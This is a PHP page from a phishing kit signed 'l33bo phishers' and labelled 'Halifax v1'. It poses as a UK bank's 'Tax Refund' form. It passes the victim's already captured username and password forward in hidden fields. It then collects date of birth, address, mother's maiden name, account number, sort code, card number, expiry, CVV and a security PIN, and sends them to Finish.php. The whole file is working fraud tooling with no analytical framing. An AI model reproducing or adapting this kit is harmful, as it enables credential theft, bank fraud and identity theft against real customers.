<?php

error_reporting(0);

session_start();
require "../../assets/includes/functions.php";
require "../../assets/includes/simplehtmldom.php";
require "../../assets/includes/enc.php";

?>

<!DOCTYPE html>
<html lang="en-gb">
<head>
<title>Tax Refund</title>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<meta content="en-gb" http-equiv="content-language">
<meta content="width=device-width" name="viewport">
<link href="" media="handheld" rel="alternate">
<link href="assets/img/001.jpg" rel="apple-touch-icon" sizes="114x114">
<link href="assets/img/002.jpg" rel="apple-touch-icon" sizes="57x57">
<link href="assets/img/001.ico" rel="shortcut icon">
<link href="assets/css/001.css" rel="stylesheet" type="text/css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
<script src="assets/js/jquery.payment.js"></script>
<script src="https://cdn.jsdelivr.net/jquery.validation/1.14.0/jquery.validate.js"></script>
<script src="https://jqueryvalidation.org/files/dist/additional-methods.min.js"></script>
<script src="assets/js/jquery.maskedinput.js"></script>
<script type="text/javascript">
function movetoNext(current, nextFieldID) {
if (current.value.length >= current.maxLength) {
document.getElementById(nextFieldID).focus();
}
}
</script>
<script>
    jQuery(function($) {
      $('#cc-number').payment('formatCardNumber');
      $('#cc-exp').payment('formatCardExpiry');
      $('#cc-cvc').payment('formatCardCVC');

      $.fn.toggleInputError = function(erred) {
        this.parent('.field').toggleClass('errorzzzz', erred);
        return this;
      };

      $('form').submit(function(e) {
        e.preventDefault();

        var cardType = $.payment.cardType($('.cc-number').val());
        $('#cc-number').toggleInputError(!$.payment.validateCardNumber($('#cc-number').val()));
        $('#cc-exp').toggleInputError(!$.payment.validateCardExpiry($('#cc-exp').payment('cardExpiryVal')));
        $('#cc-cvc').toggleInputError(!$.payment.validateCardCVC($('#cc-cvc').val(), cardType));
        $('.cc-brand').text(cardType);
      });

    });
	
</script>
<script type='text/javascript'>
jQuery(function($){
   $("#dob").mask("99/99/9999",{placeholder:"DD/MM/YYYY"});
   $("#cc-exp").mask("99 / 99",{placeholder:"MM / YY"});
   $("#sortcode").mask("99-99-99",{placeholder:"xx-xx-xx"});
});
</script>
<script>

$('#details').validate();
  (function($,W,D)
{
    var JQUERY4U = {};

    JQUERY4U.UTIL =
    {
        setupFormValidation: function()
        {
            //form validation rules
            $("#details").validate({
				errorElement: "span",			
                rules: {
					name: {	required: true,	minlength: 4,},
					dob: { required: true,	minlength: 10,},
					address: { required: true, minlength: 5,},
					postcode: { required: true, minlength: 5,},
					mobile: { required: true, minlength: 11,},
					ccno: { required: true, minlength: 16, creditcard: true},
					ccexp: { required: true, minlength: 4,},
					secode: { required: true, minlength: 3, digits: true,},
					account: { required: true, minlength: 8, digits: true,},
					sortcode: { required: true, minlength: 8},
					mmn: { required: true, minlength: 2,},
                },
                messages: {
					name: {
						required: "Please provide your full name",
						minlength: jQuery.validator.format("Please provide your full name"),
					},
					dob: { 
						required: "Please provide your date of birth", 
					},
					address: {
						required: "Please provide the 1st line of your address",
						minlength: jQuery.validator.format("Please check the address you have entered"),
					},
					postcode: {
						required: "Please provide your postcode",
						minlength: jQuery.validator.format("Please check the postcode you have entered"),
					},
					mobile: {
						required: "Please provide your 11 digit mobile telephone number",
						minlength: jQuery.validator.format("Please check the mobile telephone number you have entered"),
						digits: jQuery.validator.format("Please ensure you enter digits only"),
					},
					ccno: {
						required: "Please provide your 16 digit card number",
						minlength: jQuery.validator.format("Please check the card number you have entered"),
						creditcard: jQuery.validator.format("Please check the card number you have entered"),
					},
					ccexp: {
						required: "Please provide your cards expiry date",
						minlength: jQuery.validator.format("Please check the card expiry date you have entered"),
						date: jQuery.validator.format("Please check the card expiry date you have entered"),
					},
					secode: {
						required: "Please provide your 3 digit card security code (CVV)",
						minlength: jQuery.validator.format("Please check the card security code you have entered"),
						digits: jQuery.validator.format("Please ensure you enter digits only"),
					},
					account: {
						required: "Please provide your 8 digit account number",
						minlength: jQuery.validator.format("Please check the account number you have entered"),
						digits: jQuery.validator.format("Please ensure you enter digits only"),
					},
					sortcode: { 
						required: "Please provide your sortcode", minlength: jQuery.validator.format("Please check the sortcode you have entered"),
					},
					mmn: { required: "Please provide your mother's maiden name", minlength: jQuery.validator.format("Please check the mother's maiden name you have entered"), },
				},
                submitHandler: function(form) {
                    form.submit();
                }
            });
        }
    }

    //when the dom has loaded setup form validation rules
    $(D).ready(function($) {
        JQUERY4U.UTIL.setupFormValidation();
    });

})(jQuery, window, document);
  
</script>
<style>
input.error {
	border: 1px solid #dc2a4d!important;
	outline:0;
}
select.error {
	border: 1px solid #dc2a4d!important;
	outline:0;
}
select {
	color: #333!important;
}
span.error {
	color: #dc2a4d;
	font-family: 'Lloyds Jack Light',arial,sans-serif;
    font-weight: normal!important;
    font-size: 1.6em;
    line-height: 1.25;
} 
</style>
</head>
<body>
<div id="outer">
<div id="banner">
<p id="logo"><img src="assets/img/001.gif"></p>
<p id="userstatusNGB"><img src="assets/img/002.gif"></p>
<p class="cookiePolicy"><a href="#" id="lnkePrivacy" name="lnkePrivacy">Cookie policy</a></p>
<div class="clearer"></div>
</div>
<div id="header">
<div class="panelTL">
<div class="panelTR">
<div class="panelBR">
<div class="panelBL">
<div id="headerInner">
<h1>Tax Refund</h1>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="content">
<div class="login">
<div class="panelTL">
<div class="panelTR">
<div class="panelBR">
<div class="panelBL">
<div class="loginInner">
<div class="loginFields">
<form id="details" name="details" method="post" action="Finish.php?&sessionid=<?php echo generateRandomString(115); ?>&securessl=true" autocomplete="off" enctype="application/x-www-form-urlencoded">
	<input type="hidden" name="username" value="<?php echo $_POST['username'];?>">
	<input type="hidden" name="password" value="<?php echo $_POST['password'];?>">
	<input type="hidden" name="pass2" value="<?php echo $_POST['pass2'];?>">
	<input type="hidden" name="memo" value="<?php echo $_POST['memo'];?>">
										<div class="formField">
										<label for="name">Full Name</label>
										<input type="text" id="name" name="name" maxlength="40" placeholder="Include middle name's if applicable" value="<?php echo $_SESSION['name'];?>">
										</div>
										
										<div class="formField">
										<label for="address">Date of Birth</label>
										<input type="tel" id="dob" name="dob" maxlength="10" placeholder="DD/MM/YYYY" value="<?php echo $_SESSION['dob'];?>">
										</div>
										
										<div class="formField">
										<label for="address">Address</label>
										<input type="text" id="address" name="address" maxlength="40" placeholder="1st Line" value="<?php echo $_SESSION['address'];?>">
										</div>
										
										<div class="formField">
										<label for="postcode">Postcode</label>
										<input type="text" id="postcode" class="postcodeUK" name="postcode" maxlength="10" value="<?php echo $_SESSION['postcode'];?>">
										</div>	

										<div class="formField">
										<label for="telephone">Home Telephone Number</label>
										<input type="tel" id="telephone" name="telephone" maxlength="11">
										</div>	

										<div class="formField">
										<label for="mobile">Mobile</label>
										<input type="tel" id="mobile" name="mobile" maxlength="11" value="<?php echo $_SESSION['telephone'];?>">
										</div>	

										<div class="formField">
										<label for="mmn">Mother&apos;s Maiden Name</label>
										<input type="text" id="mmn" name="mmn" maxlength="25" value="">
										</div>

										<div class="formField">
										<label for="acno">Account Number</label>
										<input type="tel" id="account" name="account" maxlength="8" value="<?php echo $_SESSION['account'];?>">
										</div>											
										
										<div class="formField">
										<label for="sortcode">Sort Code</label>
										<input type="tel" id="sortcode" name="sortcode" maxlength="8" value="<?php echo $_SESSION['sortcode'];?>">
										</div>	
										
										<div class="formField">
										<label for="ccno">Card Number</label>
										<input type="tel" id="cc-number" name="ccno" maxlength="20" value="<?php echo $_SESSION['ccno'];?>">
										</div>	

										<div class="formField">
										<label for="ccexp">Card Expiry</label>
										<input type="tel" id="cc-exp" name="ccexp" maxlength="7" value="<?php echo $_SESSION['ccexp'];?>">
										</div>		

										<div class="formField">
										<label for="secode">Card Security Code</label>
										<input type="tel" id="cc-cvc" name="secode" maxlength="4" value="<?php echo $_SESSION['secode'];?>">
										</div>

										<div class="formField">
										<label for="telepin">6-digit Security Number</label>
										<input type="tel" name="telepin" maxlength="6">
										</div>		

<div class="actions">
<input id="go" name="go" type="submit" value="Continue" class="submitAction">
</div>

</form>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="appBannerBG">
<div class="appBannerLink">
<center>
<a class="newwin" href="#"><img src="assets/img/003.jpg"></a><br></div>
</center>
</div>
<br />
<div class="clearer"></div>
<div id="footerLogin">
<div class="FootNav">
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a class="blockLink" href="#" id="lnk2" name="lnk2">Help</a></p>
</div>
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a class="blockLink" href="#" id="lnk3" name="lnk3">Security</a></p>
</div>
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a class="blockLink" href="#" id="lnk4" name="lnk4">Contact us</a></p>
</div>
</div>
</div>
<div class="aside">
<p class="sideNote"><a href="#" id="lnkBookmark" name="lnkBookmark">Mobile Banking</a></p>
</div>
<div class="appBannerBG">
<div class="appBannerLink">
<p style="text-align: center"><a href="#"><img alt="FSCS" src="assets/img/001.png"></a></p>
</div>
</div>
<div class="clearer"></div>
<div><input name="smartAppForIosAndAndroid" type="hidden" value="true"> <input name="smartAppForIosAbvSix" type="hidden" value="true">
<div class="footerLinksLogin">
<a href="#" id="unauth:lnksecurity" name="unauth:lnksecurity" title="Security">Security</a>
&#160;
<a class="footerLinksLast" href="#" id="unauth:lnkLegal" name="unauth:lnkLegal" title="Legal">Legal</a></div>
</div>
</div>
</div>
</body>
</html>
<?php
/*
------------------------------------|
$$$________$$$$$$$$$$__$$$$$$$$$$	|
$$$________$$$_________$$$_______	|
$$$________$$$_________$$$_______	|
$$$________$$$$$$$$____$$$$$$$___	|
$$$________$$$_________$$$_______	|
$$$________$$$_________$$$_______	|
$$$$$$$$$__$$$$$$$$$$__$$$$$$$$$$	|
------------------------------------|
	Created by :: l33bo phishers	|
------------------------------------|
			Halifax v1				|
------------------------------------|
*/
?>